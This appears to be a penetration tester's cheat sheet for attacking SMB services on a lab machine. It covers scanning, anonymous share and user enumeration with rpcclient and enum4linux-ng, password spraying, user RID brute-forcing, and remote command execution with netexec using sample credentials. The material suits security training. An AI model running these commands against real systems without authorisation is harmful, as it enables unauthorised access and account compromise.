# SMB

## Port

| NUMBER | DESCRIPTION |
|---|---|
| 137 | NetBIOS Name Service, used for name registration and resolution |
| 138 | NetBIOS Datagram Service |
| 139 | NetBIOS Session Service |
| 445 | Microsoft-DS (Directory Services) SMB file sharing |

## Nmap

```sh
my@attack:~$ sudo nmap 10.129.202.5 -p 139,445 -sV -sC
```

## Dangerous Settings

| OPTION | VALUE |
|---|---|
| browseable | yes |
| create mask | 0777 |
| directory mask | 0777 |
| enable privileges | yes |
| guest ok | yes |
| read only | no |
| writable | yes |

## Anonymous Listing

```sh
my@attack:~$ smbclient -N -L //10.129.202.5
```

```output title="Output" hl_lines="6"
Can't load /etc/samba/smb.conf - run testparm to debug it

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      InFreight SMB v3.1
        IPC$            IPC       IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

## Anonymous Login

### smbclient

```sh
my@attack:~$ smbclient -N //10.129.202.5/sambashare
```

### rpcclient

```sh
my@attack:~$ rpcclient -N -U "" 10.129.202.5
```

## Status

```sh
my@attack:~$ sudo smbstatus
```

## Download a File

```sh
smb: \> get flag.txt
```

## Executing System Commands

```sh
smb: \> !cat flag.txt
```

## [enum4linux-ng](https://github.com/cddmp/enum4linux-ng)

```sh
my@attack:~$ enum4linux-ng.py -A 10.129.202.5
```

## RPC

### Server Information

```sh
rpcclient $> srvinfo
```

```output title="Output" hl_lines="1"
DEVSMB         Wk Sv PrQ Unx NT SNT InlaneFreight SMB server (Samba, Ubuntu)
platform_id     :       500
os version      :       6.1
server type     :       0x809a03
```

### Domain Information

```sh
rpcclient $> querydominfo
```

```output title="Output" hl_lines="1"
Domain:         DEVOPS
Server:         DEVSMB
Comment:        InlaneFreight SMB server (Samba, Ubuntu)
Total Users:    0
Total Groups:   0
Total Aliases:  0
Sequence No:    1748044084
Force Logoff:   4294967295
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1
```

### Available Shares Enumeration

```sh
rpcclient $> netshareenumall
```

```output title="Output" hl_lines="1 5 9"
netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
netname: IPC$
        remark: IPC Service (InlaneFreight SMB server (Samba, Ubuntu))
        path:   C:\tmp
        password:
```

### Specific Share Information

```sh
rpcclient $> netsharegetinfo sambashare
```

```output title="Output"
netname: sambashare
        remark: InFreight SMB v3.1
        path:   C:\home\sambauser\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS
                SID: S-1-1-0
```

### User Enumeration

```sh
rpcclient $> queryuser 0x1f5
```

```output title="Output"
User Name   :   nobody
Full Name   :   nobody
Home Drive  :
Dir Drive   :   (null)
Profile Path:
Logon Script:
Description :
Workstations:
Comment     :
Remote Dial :
Logon Time               :      Thu, 01 Jan 1970 02:00:00 EET
Logoff Time              :      Thu, 14 Sep 30828 05:48:05 +03
Kickoff Time             :      Thu, 14 Sep 30828 05:48:05 +03
Password last set Time   :      Thu, 01 Jan 1970 02:00:00 EET
Password can change Time :      Thu, 01 Jan 1970 02:00:00 EET
Password must change Time:      Thu, 01 Jan 1970 02:00:00 EET
unknown_2[0..31]...
user_rid :      0x1f5
group_rid:      0x201
acb_info :      0x00000010
fields_present: 0x00ffffff
logon_divs:     168
bad_password_count:     0x00000000
logon_count:    0x00000000
padding1[0..7]...
logon_hrs[0..21]...
```

### Group Information

```sh
rpcclient $> querygroup 0x201
```

```output title="Output"
Group Name:     None
Description:    Ordinary Users
Group Attribute:7
Num Members:0
```

## [RCE](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command)

```sh
my@attack:~$ nxc smb 10.129.202.5 -u 'Administrator' -p 'Company01!' -x 'whoami' --exec-method smbexec
```

## [Password Spraying](https://www.netexec.wiki/smb-protocol/password-spraying)

```sh
my@attack:~$ nxc smb 10.129.202.5 -u usernames.txt -p 'Company01!' --local-auth --continue-on-success
```

## Brute Forcing Users

### Manual Method

```sh
my@attack:~$ for i in $(seq 500 1100); do rpcclient -N -U "" 10.129.202.5 -c "queryuser 0x$(printf '%x\n' "$i")" 2> /dev/null | grep 'User Name\|user_rid\|group_rid' && echo; done
```

### Impacket

```sh
my@attack:~$ samrdump.py 10.129.202.5
```

```sh
my@attack:~$ samrdump.py 'sequel.htb'/'oscar':'86LxLBMgEWaKUnBG'@10.129.202.5
```
